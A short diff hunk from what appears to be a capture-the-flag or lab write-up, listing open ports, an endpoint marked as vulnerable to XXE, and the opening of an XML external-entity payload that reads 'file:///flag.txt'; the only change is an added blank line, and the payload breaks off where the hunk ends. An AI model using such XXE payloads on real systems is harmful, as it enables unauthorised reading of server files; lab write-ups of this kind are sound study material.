@@ -82,6 +82,7 @@ __Ports:__ 22,80,8000
 -   `/product/1?xml` [XXE] [POST]
 
 <br>
+
 ```xml
 <!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///flag.txt">
